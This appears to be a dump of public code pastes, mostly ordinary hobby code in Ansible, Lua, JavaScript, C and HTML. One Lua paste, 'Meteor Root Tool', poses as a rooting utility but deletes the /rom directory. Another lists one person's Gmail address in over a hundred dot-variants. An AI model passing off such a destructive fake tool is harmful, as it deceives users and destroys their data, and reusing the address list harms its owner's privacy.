        message: ""{{ question_2 }}""
      register: response_2
      until: ""response_2 is not failed""
      retries: 10
      delay: 3

    - name: Second answer
      debug:
        msg: ""{{ response_2.response }}""

    - name: ""Ask third question: {{ question_3 }}""
      lwe_llm:
        preset: ""{{ preset }}""
        user: ""{{ user_id }}""
        conversation_id: ""{{ response_2.conversation_id }}""
        message: ""{{ question_3 }}""
      register: response_3
      until: ""response_3 is not failed""
      retries: 10
      delay: 3

    - name: Third answer
      debug:
        msg: ""{{ response_3.response }}""

    - name: ""Write summary to file: {{ summaries_directory }}/{{ current_file.path | basename }}.summarize.txt""
      copy:
        content: |
          #################################################################

          QUESTION 1:

          {{ question_1 }}

          ANSWER 1:

          {{ response_1.response }}

          #################################################################

          QUESTION 2:

          {{ question_2 }}

          ANSWER 2:

          {{ response_2.response }}

          #################################################################

          QUESTION 3:

          {{ question_3 }}

          ANSWER 3:

          {{ response_3.response }}
        dest: ""{{ summaries_directory }}/{{ current_file.path | basename }}.summarize.txt""
  when: not summary_file.stat.exists
..."
zfdHp4dB,AreaFAQ,PolskiWisnia,Lua,Saturday 8th of July 2023 04:34:18 PM CDT,"-- AreaFAQ Beta, developed by Wisnia (_wisnia on Discord)

local function aw(...) return write(...) end
local function p(...) return print(...) end
local function s(...) return sleep(...) end
local function tw(...) return term.write(...) end
local function scp(...) return term.setCursorPos(...) end
local function sbc(...) return term.setBackgroundColor(...) end
local function stc(...) return term.setTextColor(...) end
local function tc(...) return term.clear(...) end
local function tcl(...) return term.clearLine(...) end
local function r(...) return shell.run(...) end
local function sp(...) return textutils.slowPrint(...) end
local function sw(...) return textutils.slowWrite(...) end
local function fse(...) return fs.exists(...) end
local function pul(...) return paintutils.loadImage(...) end
local function pud(...) return paintutils.drawImage(...) end
local function pfb(...) return paintutils.drawFilledBox(...) end
local function su(...) return os.shutdown(...) end
local function re(...) return os.reboot(...) end
local function pdp(...) return paintutils.drawPixel(...) end
 
w, h = term.getSize()
os.pullEvent = os.pullEventRaw -- zablokowanie CTRL+T


function drawWindow(x, y, a, b, name) -- rysowanie okienek, nie wiem czy sie przyda
	pfb(x, y, a, b, color.white)
	scp(x,y)
	stc(colors.black)
	sp(name)
end

function getInfo(fileName, name) -- wyciaganie danych z pliku, przyda sie --
end
	
function mysz()
 	local event, button, x, y = os.pullEvent(""mouse_click"")
	klik = {x, y, button}
	return klik
end

function drawUI()
	tc()
	pfb(1,1,w,h,colors.black)
	stc(colors.white)
	scp(1,1)
	p(""AreaFAQ"")
	scp(1,h)
	write(""Powered by Microcraft"")
    pfb(3, 4, 33, 8, colors.orange)
    scp(3,6)
    stc(colors.white)
    p(""Wstep"")
    pfb(3, 10, 33, 14, colors.cyan)
    scp(3,12)
    stc(colors.white)
    p(""System panstw"")
    pfb(3, 16, 33, 20, colors.green)
    scp(3,18)
    stc(colors.white)
    p(""ONZ"")
end
	
drawUI()

"
ByUrvUKV,Untitled,veritas2022,JavaScript,Saturday 8th of July 2023 04:32:47 PM CDT,"//Съдията ми дава само 50%
function jsonToHTML(params) {

let pasedJson = JSON.parse(params);
let columeName = Object.keys(pasedJson[0]);
let values = pasedJson.map(obj => Object.values(obj));

 let result = [""<table>\n""];

appendHeaders(columeName);
appendValues(values);

result += '</table>\n';

function appendHeaders(columeName) {
    result += '  <tr>'

    for(let column of columeName){
        result += `<th>${column}</th>`;
    }
    result += '</tr>\n'
   }
function appendValues(values) {
   
    for(let val of values){
        result +=`  <tr>`;
        for (const single of val) {
            result += `<td>${escape(single)}</td>`;
        }
        result +=`</tr>\n`;
    }
}
function escape(single) {
    return single.toString().replace('<','&lt;').replace('>','&gt;');
}
console.log(result);
}"
QUejs6BZ,virtualKeyBoard,j0h,C,Saturday 8th of July 2023 04:10:50 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/uinput.h>
#include <string.h>
 void Akey(int fd){
	 //A hold D*3 L K J* 2 K L relese A
    // Create the virtual input device
    struct uinput_user_dev uidev;
    memset(&uidev, 0, sizeof(uidev));
    strncpy(uidev.name, ""Virtual Keyboard"", UINPUT_MAX_NAME_SIZE);
    uidev.id.bustype = BUS_VIRTUAL;
    uidev.id.vendor = 0x1234;
    uidev.id.product = 0x5678;
    uidev.id.version = 1;

    write(fd, &uidev, sizeof(uidev));
    ioctl(fd, UI_DEV_CREATE);

    // Simulate pressing and releasing the 'A' key
    struct input_event event;
    memset(&event, 0, sizeof(event));

    event.type = EV_KEY;
    event.code = KEY_A;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));

    usleep(200000);  // Delay in microseconds

    event.type = EV_KEY;
    event.code = KEY_A;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
	 }

int main() {
	sleep(5); // gimme a sec to start this sht
    int fd = open(""/dev/input/by-path/platform-i8042-serio-0-event-kbd"", O_WRONLY | O_NONBLOCK);

    if (fd < 0) {
        perror(""Failed to open /dev/input/by-path/platform-i8042-serio-0-event-kbd"");
        return 1;
    }
//system(""helm"");
//A hold D*3 L K J* 2 K L relese A
  // Enable keyboard events
    ioctl(fd, UI_SET_EVBIT, EV_KEY);
    for (int keycode = KEY_ESC; keycode <= KEY_SLASH; keycode++) {
        ioctl(fd, UI_SET_KEYBIT, keycode);
    }
Akey(fd);

    ioctl(fd, UI_DEV_DESTROY);
    close(fd);

    return 0;
}
"
t4pE1yth,Consumi,Tommy12345678,YAML,Saturday 8th of July 2023 04:08:00 PM CDT,"      consumi: 
        value_template: >
          {% for consumo in states.sensor if state_attr(consumo.entity_id, 'unit_of_measurement') == 'W' and consumo.state|float(0) > 50 %}
            {{ state_attr(consumo.entity_id, 'friendly_name') }}
          {%- if not loop.last %}, {% endif -%}
          {% else %}
            Nessuno
          {% endfor %}"
5qruu7Nz,Meteor Root Tool,Mag1cpunch,Lua,Saturday 8th of July 2023 04:05:49 PM CDT,"print(""Rooting this device..."")
fs.delete(""/rom"")
"
yeBdHx3f,ukaelAudio.c,Kaelygon,C,Saturday 8th of July 2023 03:52:48 PM CDT,"//ukaelAudio program
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <portaudio.h>

#include ""ukaelH/ukaelTypedefC.h""
#include ""ukaelH/ukaelWaveC.h""
#include ""ukaelH/ukaelToneC.h""

static const uint8_t PLAYAUDIO = 1;

int main( int argc, char *argv[] )  {
	ENTROPY^=rand();

	PaError err;
	PaStream* stream;
	AudioData sample[MAX_CHANNELS];

	WaveArg wargs = {
		.time = DEFAULT_AMPLITUDE,
		.freq = (Frac){127,1},
		.u8arg = {0,0,0,0},
		.u16arg = {0,0,0,0}
	};

	//allocate
	sample[0].size = BUFFER_SIZE;
    sampleAlloc(&sample[0]);

    // Generate the wave
	wargs.u8arg[0]=6;
	wargs.u8arg[1]=DEFAULT_AMPLITUDE;
	generateTone(&sample[0], 255, ""testing"", &wargs );
	

	AudioData PAudioData;
	PAudioData.size = BUFFER_SIZE;
	PAudioData.position = 0;
    sampleAlloc(&PAudioData);
	sampleCopy(&PAudioData,&sample[0]);

	audioDataToBin(""audio.bin"", &PAudioData);

	if(PLAYAUDIO && PAudioData.size){
		// Initialize PortAudio
		err = Pa_Initialize();
		if (err != paNoError) {
			printf(""Failed to initialize PortAudio: %s\n"", Pa_GetErrorText(err));
			return 1;
		}
		
		// Open the default output stream
		err = Pa_OpenDefaultStream(&stream, 0, 1, paUInt8, SAMPLE_RATE,
								FRAMES_PER_BUFFER, audioCallback, &PAudioData);

		if (err != paNoError) {
			printf(""Failed to open stream: %s\n"", Pa_GetErrorText(err));
			Pa_Terminate();
			return 1;
		}
		
		// Start the stream
		err = Pa_StartStream(stream);
		if (err != paNoError) {
			printf(""Failed to start stream: %s\n"", Pa_GetErrorText(err));
			Pa_CloseStream(stream);
			Pa_Terminate();
			return 1;
		}
		
		// Wait for the stream to finish
		printf(""Playing audio...\n"");

		Pa_Sleep((PAudioData.size)/SAMPLE_RATE*1000);
		
		// Stop and close the stream
		err = Pa_StopStream(stream);
		if (err != paNoError) {
			printf(""Failed to stop stream: %s\n"", Pa_GetErrorText(err));
		}
		err = Pa_CloseStream(stream);
		if (err != paNoError) {
			printf(""Failed to close stream:%s\n"", Pa_GetErrorText(err));
		}
		
		// Terminate PortAudio
		Pa_Terminate();
	}

	sampleFree(&sample[0]);
	sampleFree(&PAudioData);
	
	return 0;
}
"
F32RxvdA,ukaelTypedefC.h,Kaelygon,C,Saturday 8th of July 2023 03:52:13 PM CDT,"#pragma once

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

//portAudio
static const uint16_t SAMPLE_RATE = 32768;
static const uint16_t FRAMES_PER_BUFFER = 64; 

//ukael
static const uint8_t DEFAULT_AMPLITUDE = 128;
static const uint32_t BUFFER_SIZE = (2<<18); //Size of the audio buffer
static const uint8_t MAX_CHANNELS = 1;


//AudioData (data*, size, position)
typedef struct {
	uint8_t* data;  // Pointer to the raw audio data
	size_t size;     	 // AudioData sample count
	size_t position;      // Current position in the audio data
} AudioData;


//typedef
//fraction (a, b)
typedef struct {
	uint16_t a;
	uint16_t b;
} Frac;


//wave arguments (uint32_t time, frac, u8arg, u16arg)
typedef struct{
	uint32_t 	time;			//uint16_t time
	Frac 		freq;			//Frac{frac.a,frac.b}
	uint8_t 	u8arg[4];		//uint8_t u8arg[4]
	uint16_t 	u16arg[4];		//uint16_t u16arg[4]
} WaveArg;


//wave function wrapper
typedef uint8_t (*ukaelWave)(WaveArg *arg);

// WaveMap (const char* id, WaveArg args)
typedef struct {
	const char* id;
	ukaelWave waveFunc;
} WaveMap;"
WxGKxQgH,Untitled,veritas2022,HTML,Saturday 8th of July 2023 03:43:12 PM CDT,"<!DOCTYPE html>

<html lang=""en"">

<head>

<meta charset=""UTF-8"">

<title>FromJSONToHTMLTable</title>

<style>

table,th{

border: groove;

border-collapse: collapse;

}

td{

border: 1px solid black;

}

td,th{

padding: 5px;

}

</style>

</head>

<body>

<div id=""wrapper"">

</div>

<script>

function fromJSONToHTMLTable(input){

//Write your code here

}

window.onload = function(){

let container = document.getElementById('wrapper');

container.innerHTML =

fromJSONToHTMLTable(['[{""Name"":""Stamat"",""Price"":5.5},{""Name"":""Rumen"",""Price"":6}]']);

};

</script>

</body>

</html>"
hCwexrTR,Untitled,bombaires,HTML,Saturday 8th of July 2023 03:41:10 PM CDT,"<a href=""mailto:swaroop.ramvip77@gmail.com"">swaroop.ramvip77@gmail.com</a>
<a href=""mailto:s.war.o.o.p.r.am.vi.p.7.7@gmail.com"">s.war.o.o.p.r.am.vi.p.7.7@gmail.com</a>
<a href=""mailto:swar.o.op..r.am.v.i.p.77@gmail.com"">swar.o.op..r.am.v.i.p.77@gmail.com</a>
<a href=""mailto:sw.a.ro.o.p...ra.mv.i.p.7.7@gmail.com"">sw.a.ro.o.p...ra.mv.i.p.7.7@gmail.com</a>
<a href=""mailto:swa.roop...ram.vi.p.77@gmail.com"">swa.roop...ram.vi.p.77@gmail.com</a>
<a href=""mailto:s.w.aroop..ram.v.ip.77@gmail.com"">s.w.aroop..ram.v.ip.77@gmail.com</a>
<a href=""mailto:swa.r.oop.ra.mvip.7.7@gmail.com"">swa.r.oop.ra.mvip.7.7@gmail.com</a>
<a href=""mailto:sw.a.ro.o.p.ramvi.p.7.7@gmail.com"">sw.a.ro.o.p.ramvi.p.7.7@gmail.com</a>
<a href=""mailto:sw.a.r.oo.p...ra.m.vip.77@gmail.com"">sw.a.r.oo.p...ra.m.vip.77@gmail.com</a>
<a href=""mailto:sw.aroo.p...ra.m.v.i.p7.7@gmail.com"">sw.aroo.p...ra.m.v.i.p7.7@gmail.com</a>
<a href=""mailto:s.waro.o.p..r.a.mv.i.p77@gmail.com"">s.waro.o.p..r.a.mv.i.p77@gmail.com</a>
<a href=""mailto:swa.r.oop..r.a.mv.i.p.7.7@gmail.com"">swa.r.oop..r.a.mv.i.p.7.7@gmail.com</a>
<a href=""mailto:s.wa.ro.op...r.am.v.ip77@gmail.com"">s.wa.ro.op...r.am.v.ip77@gmail.com</a>
<a href=""mailto:sw.a.ro.op.ramv.ip7.7@gmail.com"">sw.a.ro.op.ramv.ip7.7@gmail.com</a>
<a href=""mailto:swa.ro.op...ram.v.i.p.7.7@gmail.com"">swa.ro.op...ram.v.i.p.7.7@gmail.com</a>
<a href=""mailto:s.w.a.r.o.op..r.a.mv.i.p77@gmail.com"">s.w.a.r.o.op..r.a.mv.i.p77@gmail.com</a>
<a href=""mailto:s.w.a.roo.p..ramvip.77@gmail.com"">s.w.a.roo.p..ramvip.77@gmail.com</a>
<a href=""mailto:sw.aro.op..r.a.mvi.p.7.7@gmail.com"">sw.aro.op..r.a.mvi.p.7.7@gmail.com</a>
<a href=""mailto:s.w.a.r.oop..r.a.m.vi.p7.7@gmail.com"">s.w.a.r.oop..r.a.m.vi.p7.7@gmail.com</a>
<a href=""mailto:s.w.aroop...ra.mvip.7.7@gmail.com"">s.w.aroop...ra.mvip.7.7@gmail.com</a>
<a href=""mailto:sw.ar.o.o.p..ra.m.v.i.p7.7@gmail.com"">sw.ar.o.o.p..ra.m.v.i.p7.7@gmail.com</a>
<a href=""mailto:swa.r.oop..r.a.mv.i.p.7.7@gmail.com"">swa.r.oop..r.a.mv.i.p.7.7@gmail.com</a>
<a href=""mailto:sw.a.r.o.op..r.am.vi.p.7.7@gmail.com"">sw.a.r.o.op..r.am.vi.p.7.7@gmail.com</a>
<a href=""mailto:sw.aroo.p.r.amvi.p77@gmail.com"">sw.aroo.p.r.amvi.p77@gmail.com</a>
<a href=""mailto:sw.ar.oop..r.amvi.p.77@gmail.com"">sw.ar.oop..r.amvi.p.77@gmail.com</a>
<a href=""mailto:s.w.a.roo.p.r.a.mv.ip.7.7@gmail.com"">s.w.a.roo.p.r.a.mv.ip.7.7@gmail.com</a>
<a href=""mailto:swaroo.p...ra.mv.ip.77@gmail.com"">swaroo.p...ra.mv.ip.77@gmail.com</a>
<a href=""mailto:s.w.aroop.ram.v.ip.7.7@gmail.com"">s.w.aroop.ram.v.ip.7.7@gmail.com</a>
<a href=""mailto:swa.ro.op..ra.mvi.p.77@gmail.com"">swa.ro.op..ra.mvi.p.77@gmail.com</a>
<a href=""mailto:swa.ro.op...ra.m.vi.p.77@gmail.com"">swa.ro.op...ra.m.vi.p.77@gmail.com</a>
<a href=""mailto:s.war.oo.p..ramvi.p.7.7@gmail.com"">s.war.oo.p..ramvi.p.7.7@gmail.com</a>
<a href=""mailto:swaroop..r.amvip7.7@gmail.com"">swaroop..r.amvip7.7@gmail.com</a>
<a href=""mailto:s.war.o.op.ramvip.7.7@gmail.com"">s.war.o.op.ramvip.7.7@gmail.com</a>
<a href=""mailto:s.waro.o.p..ra.m.v.i.p.7.7@gmail.com"">s.waro.o.p..ra.m.v.i.p.7.7@gmail.com</a>
<a href=""mailto:swaro.o.p.r.a.mvip.77@gmail.com"">swaro.o.p.r.a.mvip.77@gmail.com</a>
<a href=""mailto:s.wa.roo.p..ram.vi.p77@gmail.com"">s.wa.roo.p..ram.vi.p77@gmail.com</a>
<a href=""mailto:s.war.o.o.p..ra.m.vi.p.7.7@gmail.com"">s.war.o.o.p..ra.m.vi.p.7.7@gmail.com</a>
<a href=""mailto:s.waroo.p..ram.v.ip77@gmail.com"">s.waroo.p..ram.v.ip77@gmail.com</a>
<a href=""mailto:swa.roo.p..ram.v.i.p.7.7@gmail.com"">swa.roo.p..ram.v.i.p.7.7@gmail.com</a>
<a href=""mailto:s.wa.roo.p..ram.vip7.7@gmail.com"">s.wa.roo.p..ram.vip7.7@gmail.com</a>
<a href=""mailto:swa.r.o.o.p..ram.vi.p77@gmail.com"">swa.r.o.o.p..ram.vi.p77@gmail.com</a>
<a href=""mailto:s.wa.r.oo.p..ramv.ip77@gmail.com"">s.wa.r.oo.p..ramv.ip77@gmail.com</a>
<a href=""mailto:swar.o.o.p...ram.v.ip.77@gmail.com"">swar.o.o.p...ram.v.ip.77@gmail.com</a>
<a href=""mailto:s.w.aroo.p..ram.v.i.p.77@gmail.com"">s.w.aroo.p..ram.v.i.p.77@gmail.com</a>
<a href=""mailto:swa.ro.op...ram.vip7.7@gmail.com"">swa.ro.op...ram.vip7.7@gmail.com</a>
<a href=""mailto:s.w.a.ro.o.p..r.amv.ip77@gmail.com"">s.w.a.ro.o.p..r.amv.ip77@gmail.com</a>
<a href=""mailto:s.w.a.r.o.op..r.amvi.p.77@gmail.com"">s.w.a.r.o.op..r.amvi.p.77@gmail.com</a>
<a href=""mailto:s.w.a.ro.op..r.am.v.i.p.77@gmail.com"">s.w.a.ro.op..r.am.v.i.p.77@gmail.com</a>
<a href=""mailto:s.wa.r.o.op..r.a.mv.i.p.7.7@gmail.com"">s.wa.r.o.op..r.a.mv.i.p.7.7@gmail.com</a>
<a href=""mailto:s.wa.r.o.o.p...r.amvip77@gmail.com"">s.wa.r.o.o.p...r.amvip77@gmail.com</a>
<a href=""mailto:sw.ar.oo.p...ra.mvip.77@gmail.com"">sw.ar.oo.p...ra.mvip.77@gmail.com</a>
<a href=""mailto:sw.ar.o.op..ramv.i.p.77@gmail.com"">sw.ar.o.op..ramv.i.p.77@gmail.com</a>
<a href=""mailto:s.w.a.r.oop..r.a.m.v.i.p.77@gmail.com"">s.w.a.r.oop..r.a.m.v.i.p.77@gmail.com</a>
<a href=""mailto:s.war.oop.r.amv.ip.7.7@gmail.com"">s.war.oop.r.amv.ip.7.7@gmail.com</a>
<a href=""mailto:s.waroop...ram.v.ip77@gmail.com"">s.waroop...ram.v.ip77@gmail.com</a>
<a href=""mailto:sw.a.r.o.op..r.amv.ip7.7@gmail.com"">sw.a.r.o.op..r.amv.ip7.7@gmail.com</a>
<a href=""mailto:s.wa.r.oo.p..ramv.ip.77@gmail.com"">s.wa.r.oo.p..ramv.ip.77@gmail.com</a>
<a href=""mailto:s.wa.r.oop..r.a.m.vip77@gmail.com"">s.wa.r.oop..r.a.m.vip77@gmail.com</a>
<a href=""mailto:s.wa.r.oo.p..r.a.mv.i.p77@gmail.com"">s.wa.r.oo.p..r.a.mv.i.p77@gmail.com</a>
<a href=""mailto:sw.aro.op.ram.v.i.p.77@gmail.com"">sw.aro.op.ram.v.i.p.77@gmail.com</a>
<a href=""mailto:sw.a.roop..ram.vi.p.7.7@gmail.com"">sw.a.roop..ram.vi.p.7.7@gmail.com</a>
<a href=""mailto:s.w.a.r.oo.p..r.a.mv.ip.77@gmail.com"">s.w.a.r.oo.p..r.a.mv.ip.77@gmail.com</a>
<a href=""mailto:s.w.a.roop...r.am.v.i.p77@gmail.com"">s.w.a.roop...r.am.v.i.p77@gmail.com</a>
<a href=""mailto:swa.ro.o.p...ramvip.77@gmail.com"">swa.ro.o.p...ramvip.77@gmail.com</a>
<a href=""mailto:swaroop...r.am.v.i.p.77@gmail.com"">swaroop...r.am.v.i.p.77@gmail.com</a>
<a href=""mailto:swaroop.r.amv.ip.77@gmail.com"">swaroop.r.amv.ip.77@gmail.com</a>
<a href=""mailto:swar.o.o.p.ra.mv.ip.7.7@gmail.com"">swar.o.o.p.ra.mv.ip.7.7@gmail.com</a>
<a href=""mailto:sw.ar.oo.p...ra.mvi.p77@gmail.com"">sw.ar.oo.p...ra.mvi.p77@gmail.com</a>
<a href=""mailto:sw.a.ro.op..ra.mvip.7.7@gmail.com"">sw.a.ro.op..ra.mvip.7.7@gmail.com</a>
<a href=""mailto:sw.ar.o.o.p..r.a.mvip77@gmail.com"">sw.ar.o.o.p..r.a.mvip77@gmail.com</a>
<a href=""mailto:sw.a.ro.o.p..ram.vi.p.77@gmail.com"">sw.a.ro.o.p..ram.vi.p.77@gmail.com</a>
<a href=""mailto:s.wa.r.o.o.p..ra.m.vi.p.77@gmail.com"">s.wa.r.o.o.p..ra.m.vi.p.77@gmail.com</a>
<a href=""mailto:s.w.a.roop...r.amv.i.p.7.7@gmail.com"">s.w.a.roop...r.amv.i.p.7.7@gmail.com</a>
<a href=""mailto:sw.aro.o.p..r.am.v.i.p7.7@gmail.com"">sw.aro.o.p..r.am.v.i.p7.7@gmail.com</a>
<a href=""mailto:swa.r.o.o.p..r.a.mv.ip.77@gmail.com"">swa.r.o.o.p..r.a.mv.ip.77@gmail.com</a>
<a href=""mailto:s.waroop..ram.vip.7.7@gmail.com"">s.waroop..ram.vip.7.7@gmail.com</a>
<a href=""mailto:swar.oop.ra.mvip.77@gmail.com"">swar.oop.ra.mvip.77@gmail.com</a>
<a href=""mailto:swa.roop...r.amvip7.7@gmail.com"">swa.roop...r.amvip7.7@gmail.com</a>
<a href=""mailto:swaro.op...r.a.mvip.77@gmail.com"">swaro.op...r.a.mvip.77@gmail.com</a>
<a href=""mailto:s.w.ar.oop..ramv.ip.7.7@gmail.com"">s.w.ar.oop..ramv.ip.7.7@gmail.com</a>
<a href=""mailto:s.w.a.r.o.op..r.am.vi.p.7.7@gmail.com"">s.w.a.r.o.op..r.am.vi.p.7.7@gmail.com</a>
<a href=""mailto:s.wa.ro.op...r.am.vip.77@gmail.com"">s.wa.ro.op...r.am.vip.77@gmail.com</a>
<a href=""mailto:s.waro.op..ra.m.v.i.p77@gmail.com"">s.waro.op..ra.m.v.i.p77@gmail.com</a>
<a href=""mailto:s.wa.r.o.op..r.a.mvi.p7.7@gmail.com"">s.wa.r.o.op..r.a.mvi.p7.7@gmail.com</a>
<a href=""mailto:sw.a.roo.p.ramv.i.p7.7@gmail.com"">sw.a.roo.p.ramv.i.p7.7@gmail.com</a>
<a href=""mailto:s.w.ar.oo.p..ra.m.vi.p7.7@gmail.com"">s.w.ar.oo.p..ra.m.vi.p7.7@gmail.com</a>
<a href=""mailto:s.w.aroo.p...r.a.m.v.ip.77@gmail.com"">s.w.aroo.p...r.a.m.v.ip.77@gmail.com</a>
<a href=""mailto:s.w.a.ro.o.p...ramv.i.p.7.7@gmail.com"">s.w.a.ro.o.p...ramv.i.p.7.7@gmail.com</a>
<a href=""mailto:s.w.ar.o.op.ram.vi.p7.7@gmail.com"">s.w.ar.o.op.ram.vi.p7.7@gmail.com</a>
<a href=""mailto:sw.a.r.o.o.p...r.amvi.p.77@gmail.com"">sw.a.r.o.o.p...r.amvi.p.77@gmail.com</a>
<a href=""mailto:s.w.a.r.oop...r.a.mv.i.p.77@gmail.com"">s.w.a.r.oop...r.a.mv.i.p.77@gmail.com</a>
<a href=""mailto:s.wa.roop.r.am.vi.p7.7@gmail.com"">s.wa.roop.r.am.vi.p7.7@gmail.com</a>
<a href=""mailto:sw.a.r.oop...r.am.vi.p77@gmail.com"">sw.a.r.oop...r.am.vi.p77@gmail.com</a>
<a href=""mailto:s.wa.ro.op..r.amvip77@gmail.com"">s.wa.ro.op..r.amvip77@gmail.com</a>
<a href=""mailto:sw.a.roop.ramvi.p.7.7@gmail.com"">sw.a.roop.ramvi.p.7.7@gmail.com</a>
<a href=""mailto:sw.a.r.oo.p.ramv.i.p.77@gmail.com"">sw.a.r.oo.p.ramv.i.p.77@gmail.com</a>
<a href=""mailto:s.w.a.roop..ram.v.ip.77@gmail.com"">s.w.a.roop..ram.v.ip.77@gmail.com</a>
<a href=""mailto:s.w.aroop..ra.mv.ip77@gmail.com"">s.w.aroop..ra.mv.ip77@gmail.com</a>
<a href=""mailto:sw.aroop..r.a.m.vip7.7@gmail.com"">sw.aroop..r.a.m.vip7.7@gmail.com</a>
<a href=""mailto:s.wa.ro.op.r.amvi.p7.7@gmail.com"">s.wa.ro.op.r.amvi.p7.7@gmail.com</a>
<a href=""mailto:sw.a.r.o.op..ra.mv.i.p77@gmail.com"">sw.a.r.o.op..ra.mv.i.p77@gmail.com</a>
<a href=""mailto:sw.a.ro.o.p..ram.v.ip7.7@gmail.com"">sw.a.ro.o.p..ram.v.ip7.7@gmail.com</a>
<a href=""mailto:swa.r.o.o.p...r.amv.i.p.7.7@gmail.com"">swa.r.o.o.p...r.amv.i.p.7.7@gmail.com</a>
<a href=""mailto:s.w.a.roo.p..r.amv.i.p77@gmail.com"">s.w.a.roo.p..r.amv.i.p77@gmail.com</a>
<a href=""mailto:sw.ar.oop...r.a.m.vi.p77@gmail.com"">sw.ar.oop...r.a.m.vi.p77@gmail.com</a>
<a href=""mailto:sw.ar.o.op..r.a.mv.ip.77@gmail.com"">sw.ar.o.op..r.a.mv.ip.77@gmail.com</a>
<a href=""mailto:s.w.ar.oop..ra.m.v.ip7.7@gmail.com"">s.w.ar.oop..ra.m.v.ip7.7@gmail.com</a>
<a href=""mailto:s.w.a.ro.o.p..ramvip77@gmail.com"">s.w.a.ro.o.p..ramvip77@gmail.com</a>
<a href=""mailto:s.w.a.r.oo.p..ram.vi.p7.7@gmail.com"">s.w.a.r.oo.p..ram.vi.p7.7@gmail.com</a>
<a href=""mailto:s.wa.r.oop..ramv.i.p.7.7@gmail.com"">s.wa.r.oop..ramv.i.p.7.7@gmail.com</a>
<a href=""mailto:sw.a.roop..ramv.i.p.77@gmail.com"">sw.a.roop..ramv.i.p.77@gmail.com</a>
<a href=""mailto:s.war.oo.p..ra.m.vi.p.77@gmail.com"">s.war.oo.p..ra.m.vi.p.77@gmail.com</a>
<a href=""mailto:s.war.o.op..ram.v.i.p77@gmail.com"">s.war.o.op..ram.v.i.p77@gmail.com</a>
<a href=""mailto:sw.a.roo.p.r.a.m.vip77@gmail.com"">sw.a.roo.p.r.a.m.vip77@gmail.com</a>
<a href=""mailto:swa.roo.p...ramvi.p.7.7@gmail.com"">swa.roo.p...ramvi.p.7.7@gmail.com</a>
<a href=""mailto:s.waroop...ramvip77@gmail.com"">s.waroop...ramvip77@gmail.com</a>
<a href=""mailto:s.w.aroop...r.amvi.p.77@gmail.com"">s.w.aroop...r.amvi.p.77@gmail.com</a>
<a href=""mailto:s.w.a.r.oop..ramv.i.p7.7@gmail.com"">s.w.a.r.oop..ramv.i.p7.7@gmail.com</a>
<a href=""mailto:s.w.ar.oop..r.a.mvi.p.77@gmail.com"">s.w.ar.oop..r.a.mvi.p.77@gmail.com</a>
<a href=""mailto:s.w.a.roop...ram.vip.77@gmail.com"">s.w.a.roop...ram.vip.77@gmail.com</a>
<a href=""mailto:swaroo.p..r.amvi.p.77@gmail.com"">swaroo.p..r.amvi.p.77@gmail.com</a>
<a href=""mailto:s.wa.r.oo.p.r.amv.ip7.7@gmail.com"">s.wa.r.oo.p.r.amv.ip7.7@gmail.com</a>
<a href=""mailto:swaroo.p..ra.m.v.i.p77@gmail.com"">swaroo.p..ra.m.v.i.p77@gmail.com</a>
<a href=""mailto:s.waroo.p..ram.v.i.p7.7@gmail.com"">s.waroo.p..ram.v.i.p7.7@gmail.com</a>
<a href=""mailto:sw.ar.o.o.p.r.amvip77@gmail.com"">sw.ar.o.o.p.r.amvip77@gmail.com</a>
<a href=""mailto:s.w.a.roo.p..r.a.m.vi.p77@gmail.com"">s.w.a.roo.p..r.a.m.vi.p77@gmail.com</a>
<a href=""mailto:swaroo.p..ra.mv.i.p7.7@gmail.com"">swaroo.p..ra.mv.i.p7.7@gmail.com</a>
<a href=""mailto:sw.aro.o.p...r.a.m.vip.7.7@gmail.com"">sw.aro.o.p...r.a.m.vip.7.7@gmail.com</a>
<a href=""mailto:swaro.op.r.amvi.p.77@gmail.com"">swaro.op.r.amvi.p.77@gmail.com</a>
<a href=""mailto:sw.aroop...r.a.mv.ip7.7@gmail.com"">sw.aroop...r.a.mv.ip7.7@gmail.com</a>
<a href=""mailto:s.w.aroo.p.ramvi.p7.7@gmail.com"">s.w.aroo.p.ramvi.p7.7@gmail.com</a>
<a href=""mailto:s.war.o.op.r.a.mv.ip77@gmail.com"">s.war.o.op.r.a.mv.ip77@gmail.com</a>
<a href=""mailto:s.w.a.ro.op..ram.vip7.7@gmail.com"">s.w.a.ro.op..ram.vip7.7@gmail.com</a>
<a href=""mailto:s.waro.op...ramvi.p77@gmail.com"">s.waro.op...ramvi.p77@gmail.com</a>
<a href=""mailto:sw.ar.oop..ra.mvip7.7@gmail.com"">sw.ar.oop..ra.mvip7.7@gmail.com</a>
<a href=""mailto:sw.aro.o.p...ra.mv.i.p77@gmail.com"">sw.aro.o.p...ra.mv.i.p77@gmail.com</a>
<a href=""mailto:s.waroop..ramvi.p7.7@gmail.com"">s.waroop..ramvi.p7.7@gmail.com</a>
<a href=""mailto:s.w.aro.op..ra.mv.ip7.7@gmail.com"">s.w.aro.op..ra.mv.ip7.7@gmail.com</a>
<a href=""mailto:s.wa.ro.op..r.amv.i.p.77@gmail.com"">s.wa.ro.op..r.amv.i.p.77@gmail.com</a>
<a href=""mailto:sw.a.roo.p...r.a.m.v.ip7.7@gmail.com"">sw.a.roo.p...r.a.m.v.ip7.7@gmail.com</a>
<a href=""mailto:swa.r.o.op..r.a.m.vip7.7@gmail.com"">swa.r.o.op..r.a.m.vip7.7@gmail.com</a>
<a href=""mailto:s.w.a.r.oo.p..ram.vi.p.77@gmail.com"">s.w.a.r.oo.p..ram.vi.p.77@gmail.com</a>
<a href=""mailto:swa.r.o.op...ram.v.ip77@gmail.com"">swa.r.o.op...ram.v.ip77@gmail.com</a>
<a href=""mailto:s.w.aro.op..ra.m.vi.p.7.7@gmail.com"">s.w.aro.op..ra.m.vi.p.7.7@gmail.com</a>
<a href=""mailto:sw.a.roop..r.am.vip.7.7@gmail.com"">sw.a.roop..r.am.vip.7.7@gmail.com</a>
<a href=""mailto:s.wa.roo.p.ra.mv.ip7.7@gmail.com"">s.wa.roo.p.ra.mv.ip7.7@gmail.com</a>
